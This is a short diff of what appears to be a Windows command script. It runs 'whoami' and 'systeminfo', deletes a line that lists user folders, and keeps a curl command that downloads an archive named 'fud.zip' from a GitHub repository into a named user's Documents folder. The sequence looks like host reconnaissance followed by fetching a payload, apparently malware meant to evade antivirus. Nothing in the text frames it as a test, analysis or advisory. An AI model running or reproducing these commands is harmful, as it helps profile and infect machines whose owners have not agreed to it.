@@ -1,4 +1,3 @@
 whoami
 systeminfo
-Dir C:\Users\
 curl -L -o "C:\Users\HP ZBook\Documents\fud.zip" "https://github.com/mtest8533-sys/developerRepo/raw/main/fud.zip"
